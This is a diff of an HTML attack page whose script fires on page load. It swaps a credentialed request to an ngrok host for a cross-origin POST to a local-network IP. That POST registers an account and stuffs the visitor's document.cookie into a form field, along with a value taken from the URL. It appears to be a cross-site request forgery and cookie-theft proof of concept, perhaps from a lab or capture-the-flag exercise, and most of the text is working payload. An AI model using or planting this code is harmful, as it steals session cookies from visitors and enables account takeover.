@@ -5,39 +5,26 @@
 <body>
 <script>
     window.onload = function () {
-        let urlParams;
-        (window.onpopstate = function () {
-            let match,
-                pl = /\+/g,  // Regex for replacing addition symbol with a space
-                search = /([^&=]+)=?([^&]*)/g,
-                decode = function (s) {
-                    return decodeURIComponent(s.replace(pl, " "));
+        const params = new Proxy(new URLSearchParams(window.location.search), {
+            get: (searchParams, prop) => searchParams.get(prop),
+        });
+        let value = params.user;
+        (async () => {
+            await fetch("http://192.168.2.98:65352/register", {
+                "credentials": "include",
+                "headers": {
+                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Upgrade-Insecure-Requests": "1"
                 },
-                query = window.location.search.substring(1);
-
-            urlParams = {};
-            while (match = search.exec(query))
-                urlParams[decode(match[1])] = decode(match[2]);
+                "referrer": "http://192.168.2.98:65352/",
+                "body": `username=${value}%40t.t&animal=${document.cookie}&password=t`,
+                "method": "POST",
+                "mode": "cors"
+            });
         })();
-        const req = new XMLHttpRequest();
-        req.open("GET", 'https://ca1d-45-85-144-53.ngrok.io', true);
-        req.withCredentials = true;
-        req.send(null);
-        // const data = ;
-        // fetch('https://ca1d-45-85-144-53.ngrok.io', {
-        //     method: 'POST',
-        //     headers: {
-        //         'Content-Type': 'application/json',
-        //     },
-        //     body: JSON.stringify(data),
-        // })
-        //     .then((response) => response.json())
-        //     .then((data) => {
-        //         console.log('Success:', data);
-        //     })
-        //     .catch((error) => {
-        //         console.error('Error:', error);
-        //     });
     }
 </script>
 </body>
